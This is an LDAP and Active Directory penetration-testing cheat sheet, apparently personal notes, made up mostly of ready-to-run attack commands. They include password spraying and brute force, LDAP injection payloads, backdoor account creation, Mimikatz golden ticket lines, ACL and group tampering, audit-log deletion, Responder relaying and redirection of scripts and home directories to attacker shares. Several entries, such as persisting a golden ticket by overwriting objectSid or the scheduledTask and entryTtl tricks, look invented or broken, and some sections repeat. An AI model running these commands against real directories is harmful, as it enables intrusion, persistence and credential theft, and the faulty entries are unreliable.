# Index
- [[Microsoft Active Directory (AD)]]
	- [[Active Directory Cheat Sheet]]
	- [[Kerberos Cheat Sheet]]
	- [[LDAP Cheat Sheet]]
	- [[MSSQL Cheat Sheet]]
	- [[PowerShell Active Directory Cheat Sheet]]

LDAP Penetration Testing Cheat Sheet

### 1. LDAP Enumeration and Reconnaissance

#### 1.1 Enumerate Domain Controllers via LDAP
- **nmap**:  Scans the target for open LDAP ports (389 for LDAP, 636 for LDAPS) and uses `ldap-rootdse` and `ldap-search` scripts to enumerate information from the LDAP service.
  ```bash
  nmap -p 389,636 --script ldap-rootdse,ldap-search -v -oA ldap-enum <target_ip>
  ```
  
- **Query LDAP Server for Naming Contexts**: Reveal the root domains being managed by the LDAP service.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -s base -b "" namingContexts
  ```

#### 1.2 Enumerate LDAP Schema and Objects
- **Retrieves all objects in the domain**: Displays all attributes and their values for each object.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=*)"
  ```

- **Retrieves entries in the directory that match the `person` objectClass**: Commonly used to enumerate users.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=person)"
  ```

#### 1.3 Gather Domain User Information via LDAP
- **User Enumeration**: Queries LDAP server for all user accounts by filtering the `sAMAccountType` attribute specific to user accounts.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(sAMAccountType=805306368)" sAMAccountName
  ```

- **List All groups**: Retrieves all group objects in the LDAP directory, useful for understanding group memberships and potential access control misconfigurations.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=group)"
  ```
 
#### 1.4 LDAP Search via CrackMapExec (CME)
- **CrackMapExec (LDAP Search)**: Perform an LDAP search query, enumerating all objects within the specified base distinguished name (DN).
  ```bash
  cme ldap <target_ip> -u <username> -p <password> -M ldap_search -o "base=DC=domain,DC=com"
  ```

#### 1.5 Enumerate Domain Admins via LDAP
- **List Domain Admins**: Retrieves accounts that are members of the "Domain Admins" group by filtering the `memberof` attribute.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(memberof=CN=Domain Admins,CN=Users,DC=domain,DC=com)" sAMAccountName
  ```

### 2. LDAP Exploitation Techniques

#### 2.1 Password Spraying via LDAP
- **LDAP Password Spraying**: Attempts to authenticate with the LDAP server using a username and password. Can be used in conjunction with password spraying tools to automate the process.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>'
  ```

#### 2.2 Extracting Sensitive Information via LDAP
- **Retrieve User Password Hashes (If accessible)**:  Attempts to retrieve the `userPassword` attribute for users, although most secure configurations will not allow this.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=person)" userPassword
  ```

#### 2.3 LDAP Injection Attack
- **LDAP Injection (Example Payload)**: This payload exploits LDAP injection by injecting a filter that can enumerate privileged accounts such as "admin" users.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(&(objectClass=*)(cn=*))" -D "CN=<username>,DC=domain,DC=com)(cn=*))(|(cn=admin)(cn=*" -w '<password>'
  ```

#### 2.4 Enumerating LDAP Trusts
- **Trust Enumeration via LDAP**: Enumerates domain trusts by querying the `trustedDomain` objectClass under the Configuration container.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "CN=Configuration,DC=domain,DC=com" "(objectClass=trustedDomain)"
  ```

### 3. Post-Exploitation and Persistence via LDAP

#### 3.1 Modifying LDAP Entries
- **Change User Attributes**: Modifies the `userPassword` attribute for a user, effectively changing their password. Requires appropriate privileges.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  replace: userPassword
  userPassword: new_password
  EOF
  ```

#### 3.2 Persistence via Malicious LDAP Entries
- **Create a Backdoor User via LDAP**: Adds a new user object to the LDAP directory, effectively creating a backdoor account.
  ```
  ldapadd -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=backdoor,CN=Users,DC=domain,DC=com
  objectClass: user
  sAMAccountName: backdoor
  userPassword: <backdoor_password>
  EOF
  ```

#### 3.3 Abusing LDAP for Golden Ticket Persistence
- **Mimikatz + LDAP for Golden Ticket Persistence**: Combines Mimikatz to create a golden ticket with direct LDAP modification to persist this change within the directory.
  ```powershell
  mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  replace: objectSid
  objectSid: <golden_ticket_sid>
  EOF
  ```

## 4. Advanced LDAP Enumeration Techniques

#### 4.1 Enumerate LDAP Objects with Specific Attributes
- **Retrieve Specific Attributes**: Retrieves specific attributes (`sAMAccountName`, `mail`, and `memberOf`) for all users in the directory. This is useful for gathering email addresses and group memberships.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName,mail,memberOf
  ```

#### 4.2 Enumerate LDAP Administrative Accounts
- **List Administrative Accounts**: Queries the LDAP directory for users with `adminCount=1`, which typically indicates administrative accounts.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(&(objectClass=user)(adminCount=1))"
  ```

#### 4.3 Enumerate LDAP Computer Accounts
- **Retrieve Computer Accounts**: Extracts information about computer objects, including their `sAMAccountName`, `dNSHostName`, and `operatingSystem`.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=computer)" sAMAccountName,dNSHostName,operatingSystem
  ```

#### 4.4 LDAP Paging Search
- **Paged Results Search**: This command uses the `-E pr=200/noprompt` option to perform a paged search, returning 200 entries at a time. Useful when the LDAP directory contains a large number of entries.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=*)" -E pr=200/noprompt
  ```

## 5. LDAP Exploitation Techniques (Advanced)

#### 5.1 LDAP Injection for Bypassing Authentication
- **LDAP Injection Example**: This payload attempts to bypass authentication by injecting a crafted `cn=*` filter into the LDAP query, potentially allowing access to unintended objects.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -D "CN=admin)(|(cn=*))#" -w '<password>'
  ```

#### 5.2 Exploit LDAP Referrals
- **Enumerate LDAP Referrals**: Extracts information about LDAP referrals by searching for `namingContexts`, which can reveal linked domains or directory services.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" -s base "+" "namingContexts"
  ```

#### 5.3 Exploit LDAP Anonymously
- **Anonymous LDAP Bind**: Attempts an anonymous bind to the LDAP server, useful for checking if the server allows anonymous access and what information is accessible without authentication.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com"
  ```

#### 5.4 Extract Group Policy Information via LDAP
- **Enumerate GPOs**: Extracts Group Policy Objects (GPOs) by querying the `groupPolicyContainer` objectClass, revealing policies applied within the domain.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "CN=Policies,CN=System,DC=domain,DC=com" "(objectClass=groupPolicyContainer)"
  ```

#### 5.5 Harvest Passwords from LDAP
- **Search for Password Attributes**: This command searches for objects that contain password-related attributes (`userPassword` or `unicodePwd`), potentially exposing weakly protected or misconfigured accounts.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(|(userPassword=*)(unicodePwd=*))"
  ```

## 6. LDAP Persistence and Post-Exploitation (Advanced)

#### 6.1 Backdoor LDAP Accounts via Unauthorized Modifications
- **Modify LDAP ACLs**: This command adds a new `nTSecurityDescriptor` to the `AdminSDHolder` object, backdooring the account by modifying ACLs directly through LDAP.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=AdminSDHolder,CN=System,DC=domain,DC=com
  changetype: modify
  add: nTSecurityDescriptor
  nTSecurityDescriptor:: <encoded_acl>
  EOF
  ```

#### 6.2 Abuse LDAP for Golden Ticket Generation
- **Generate Golden Ticket using Mimikatz and LDAP**: Use Mimikatz to create a golden ticket and modify the `objectSid` attribute of a user via LDAP, enabling persistent unauthorized access.
  ```powershell
  mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  replace: objectSid
  objectSid: <golden_ticket_sid>
  EOF
  ```

#### 6.3 Deploying Rogue LDAP Servers
- **Create a Rogue LDAP Server with Responder**: This command starts a rogue LDAP server using Responder, which can be used to capture LDAP authentication attempts from misconfigured systems.
  ```bash
  responder -I <interface> -f
  ```

#### 6.4 Establishing Persistence with LDAP Scripts
- **Run Persistent LDAP Script**: Adds a scheduled task object in LDAP that points to a malicious script hosted on an attacker's server, enabling persistent execution of the script.
  ```b
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<persistent_task>,CN=Tasks,CN=System,DC=domain,DC=com
  changetype: add
  objectClass: top
  objectClass: scheduledTask
  scriptPath: \\<attacker_ip>\scripts\persist.bat
  EOF
  ```

#### 6.5 Exploiting Weak ACLs in LDAP
- **Modify LDAP Objects via Weak ACLs**: Exploits weak Access Control Lists (ACLs) by adding the attacker's account as a member of a sensitive group or object.
  ```b
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<vulnerable_object>,DC=domain,DC=com
  changetype: modify
  add: member
  member: CN=<attacker_user>,DC=domain,DC=com
  EOF
  ```

## 7. LDAP-Specific Attack Techniques

#### 7.1 LDAP Brute Force Authentication
- **Brute Force LDAP Authentication with Hydra**: Uses Hydra to brute force LDAP authentication, attempting multiple password combinations against the target LDAP service.
  ```bash
  hydra -l <username> -P /path/to/passwords.txt ldap://<target_ip>
  ```

#### 7.2 LDAP Attribute Injection
- **Inject Attributes via LDAP**: Injects custom attributes into an LDAP entry, in this case adding a `description` attribute with a message, potentially altering directory information in a stealthy manner.
  ```b
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  add: description
  description: Hacked by Attacker
  EOF
  ```

#### 7.3 LDAP Replay Attack
- **Capture and Replay LDAP Traffic**: First captures LDAP traffic with `tcpdump`, then replays the captured traffic with `tcpreplay`, potentially exploiting replayable authentication or session traffic.
  ```bash
  tcpdump -i <interface> -w ldap_traffic.pcap 'tcp port 389'
  tcpreplay --loop=0 --intf1=<interface> ldap_traffic.pcap
  ```

## 8. Defense Evasion via LDAP

#### 8.1 Clearing LDAP Audit Logs
- **Delete LDAP Audit Logs**: Attempts to delete or clear LDAP audit logs to cover tracks, though this action is typically restricted to high-privileged accounts.
  ```b
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=AuditLogs,CN=System,DC=domain,DC=com
  changetype: delete
  EOF
  ```
 
#### 8.2 Obfuscating LDAP Queries
- **Obfuscated LDAP Search**: Uses obfuscation techniques in LDAP queries to hide the true intent of the search, such as by using compound filters that may bypass simple detection mechanisms.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(&(objectClass=user)(|(userPassword=*)))"
  ```

## 9. Advanced LDAP Reconnaissance Techniques

#### 9.1 Extracting Service Principal Names (SPNs)
- **Enumerate SPNs**: Extracts `servicePrincipalName` attributes from the directory, which are essential for Kerberoasting attacks. SPNs are associated with service accounts and can be targeted to extract service tickets.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(servicePrincipalName=*)" servicePrincipalName
  ```

#### 9.2 Detecting LDAP Enforced Policies
- **Enumerate Password Policies**: Queries the LDAP directory for enforced password policies such as minimum password length, lockout threshold, and password history length. This can help in crafting password attacks.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "CN=Default Domain Policy,CN=Policies,CN=System,DC=domain,DC=com" "(objectClass=domain)" minPwdLength,lockoutThreshold,pwdHistoryLength
  ```

#### 9.3 Mapping LDAP Forest and Domain Information
- **Forest and Domain Enumeration**: Enumerates cross-references within the LDAP directory to map out forest and domain structures, including trust relationships.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "CN=Partitions,CN=Configuration,DC=domain,DC=com" "(objectClass=crossRef)" nCName,trustParent
  ```

#### 9.4 Enumerating LDAP Replication Settings
- **Querying Replication Settings**: Retrieves replication settings for domain controllers within the directory, which could provide insights into potential replication-based attacks or persistence techniques.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "CN=Sites,CN=Configuration,DC=domain,DC=com" "(objectClass=nTDSDSA)" options,options
  ```

## 10. LDAP Exploitation Techniques (Advanced and Unique)

#### 10.1 Injecting Malicious LDAP Queries
- **LDAP Query Injection**: Exploits weakly validated LDAP queries by injecting a crafted query that modifies the search behavior to include unintended objects or users.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(&(objectClass=*))" -D "CN=admin)(|(cn=*))#" -w '<password>'
  ```

#### 10.2 LDAP Wildcard Attacks
- **Wildcard Query Attack**: Uses wildcards in LDAP queries to return all objects that match a specific attribute pattern, useful for mass enumeration or broad searches.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(cn=*)"
  ```

#### 10.3 Abusing LDAP Referrals for Data Exfiltration
- **Exploit LDAP Referrals**: Enumerates LDAP referrals, which can be abused to redirect LDAP queries to external servers for data exfiltration or relay attacks.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=referral)" referral
  ```

#### 10.4 LDAP Path Traversal Exploits
- **Path Traversal in LDAP**: Attempts to bypass security descriptors by exploiting directory path traversal vulnerabilities, potentially gaining unauthorized access to sensitive objects.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(&(objectClass=*)(!(nTSecurityDescriptor=*)))"
  ```

## 11. LDAP Persistence Techniques (Sophisticated Methods)

#### 11.1 Persistent Access via LDAP Operational Attributes
- **Set Operational Attributes**: Modifies operational attributes such as `pwdLastSet` to prevent password expiry, ensuring persistent access for an account.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<persistent_user>,DC=domain,DC=com
  changetype: modify
  add: pwdLastSet
  pwdLastSet: 0
  EOF
  ```

#### 11.2 Manipulating LDAP Schema for Persistence
- **Schema Manipulation**: Adds a new object class to the LDAP schema, potentially allowing the creation of custom objects that serve as backdoors or hidden administrative controls.
  ```b
  ldapmodify -x -H ldap://<target_ip> -D "CN=Schema Admin,CN=Users,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<malicious_object_class>,CN=Schema,CN=Configuration,DC=domain,DC=com
  changetype: add
  objectClass: top
  objectClass: classSchema
  EOF
  ```

#### 11.3 Creating Hidden LDAP Objects
- **Create Hidden Objects**: Creates a hidden object in LDAP by setting its `objectClass` and `displayName` attributes in such a way that it may not appear in standard directory searches.
  ```b
  ldapadd -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=hidden_object,DC=domain,DC=com
  objectClass: top
  objectClass: container
  displayName: hidden_object
  EOF
  ```

#### 11.4 Hijacking LDAP Attribute Values
- **Attribute Value Hijacking**: Hijacks specific attribute values such as `homeDirectory` to redirect user file paths or data streams to an attacker-controlled server.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  replace: homeDirectory
  homeDirectory: \\<attacker_server>\share
  EOF
  ```

#### 11.5 LDAP TTL (Time-to-Live) for Persistence
- **Set LDAP Object TTL**: Sets the `entryTtl` (Time-to-Live) for an LDAP object to enforce timed persistence, allowing the object to exist for a specified duration before self-deletion.
  ```b
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  add: entryTtl
  entryTtl: 3600
  EOF
  ```

## 12. LDAP-Specific Credential Harvesting and Manipulation

#### 12.1 LDAP Password Harvesting from User Accounts
- **Extract Passwords**: Searches for and extracts password-related attributes from user accounts, although successful extraction depends on weak or misconfigured permissions.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(|(userPassword=*)(unicodePwd=*))"
  ```

#### 12.2 Modifying LDAP User Passwords via LDAPS
- **Secure Password Modification**: Uses LDAPS (LDAP over SSL) to securely modify a user's password in the directory, ensuring encrypted transmission during the operation.
  ```bash
  ldappasswd -H ldaps://<target_ip> -x -D "CN=<username>,DC=domain,DC=com" -W -s '<new_password>' "CN=<target_user>,DC=domain,DC=com"
  ```

#### 12.3 LDAP Credential Injection for Lateral Movement
- **Inject Credentials**: Injects a new `userPassword` attribute into a user object, potentially allowing the attacker to authenticate as that user across the domain.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  add: userPassword
  userPassword: {CRYPT}<hashed_password>
  EOF
  ```

## 13. LDAP-Specific Lateral Movement Techniques

#### 13.1 Lateral Movement via LDAP Attribute Modification
- **Move User to Administrative Group**: Adds a target user to the `Administrators` group via LDAP attribute modification, granting the user elevated privileges across the domain.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=Administrators,CN=Builtin,DC=domain,DC=com
  changetype: modify
  add: member
  member: CN=<target_user>,DC=domain,DC=com
  EOF
  ```
 
#### 13.2 LDAP-Based RDP Hijacking
- **Hijack RDP Sessions via LDAP**: Modifies the `msTSAllowLogon` attribute to enable RDP logon for a target user, facilitating lateral movement via RDP session hijacking.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  replace: msTSAllowLogon
  msTSAllowLogon: TRUE
  EOF
  ```

#### 13.3 LDAP-Based Tunneling and Pivoting
- **Create LDAP Tunnel for Pivoting**: Establishes an SSH tunnel to forward LDAP traffic through a pivot host, enabling the attacker to reach otherwise inaccessible LDAP services.
  ```bash
  ssh -L 389:<target_ip>:389 <attacker_ip>
  ```

## 14. LDAP-Specific Defense Evasion Techniques

#### 14.1 Hiding LDAP Objects with ACL Manipulation
- **Hide Objects by Modifying ACLs**: Alters the ACLs (Access Control Lists) of LDAP objects to hide them from standard queries, making them accessible only to specific users or groups.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<object_to_hide>,DC=domain,DC=com
  changetype: modify
  add: nTSecurityDescriptor
  nTSecurityDescriptor:: <encoded_acl>
  EOF
  ```

#### 14.2 Evading LDAP Query Logs
- **Obfuscate LDAP Queries**: Obfuscates LDAP queries by combining multiple filters and wildcard searches, potentially bypassing simple detection mechanisms in query logs.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(&(objectClass=user)(|(cn=admin*)))"
  ```

#### 14.3 Time-Based LDAP Evasion
- **Delay LDAP Queries**: Uses the `-l` (time limit) option to delay LDAP queries, making them less likely to trigger real-time alerts or logs.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" -o ldif-wrap=no -l 10 "(objectClass=user)"
  ```

#### 14.4 LDAP Query Encryption and Evasion
- **Use LDAPS for Encrypted Queries**: Queries the LDAP directory using LDAPS (LDAP over SSL), ensuring that queries and responses are encrypted to evade network-based detection.
  ```bash
  ldapsearch -x -H ldaps://<target_ip> -b "DC=domain,DC=com" "(objectClass=*)"
  ```

## 15. Advanced LDAP Pivoting Techniques

#### 15.1 Pivoting via LDAP Referral Chaining
- **Referral Chaining Pivot**: Uses LDAP referral chaining to pivot across linked LDAP directories, potentially reaching additional domains or directories indirectly.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=referral)"
  ```

#### 15.2 LDAP Relaying for Pivoting
- **LDAP Relay Attack**: Sets up an LDAP relay attack using Responder, which can capture and relay LDAP authentication attempts for pivoting into other systems or services.
  ```bash
  responder -I <interface> -r -f -w -i <attacker_ip>
  ```

#### 15.3 Cross-Domain LDAP Enumeration
- **Enumerate Cross-Domain LDAP Objects**: Enumerates cross-domain objects in a forest, which can reveal additional LDAP directories or domains to pivot into.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "CN=Partitions,CN=Configuration,DC=domain,DC=com" "(objectClass=crossRef)"
  ```

## 16. LDAP-Specific Data Exfiltration Techniques

#### 16.1 Exfiltrating Sensitive Data via LDAP Queries
- **Export Sensitive Data**: Exports sensitive data from the LDAP directory to an LDIF (LDAP Data Interchange Format) file for offline analysis or exfiltration.
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com" "(objectClass=*)" -LLL > sensitive_data.ldif
  ```

#### 16.2 Covert Exfiltration via LDAP Hidden Attributes
- **Use Hidden Attributes for Exfiltration**: Hides exfiltrated data within LDAP object attributes, such as the `description` attribute, to covertly transmit sensitive information out of the directory.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  add: description
  description: <exfiltrated_data>
  EOF
  ```

#### 16.3 Exfiltration via LDAP Redirection
- **Redirect LDAP Queries to Attacker Server**: Redirects LDAP directory paths such as `homeDirectory` to an attacker-controlled server, enabling data exfiltration through redirected network shares.
  ```
  ldapmodify -x -H ldap://<target_ip> -D "CN=<username>,DC=domain,DC=com" -w '<password>' <<EOF
  dn: CN=<target_user>,DC=domain,DC=com
  changetype: modify
  add: homeDirectory
  homeDirectory: \\<attacker_ip>\exfil_share
  EOF
  ```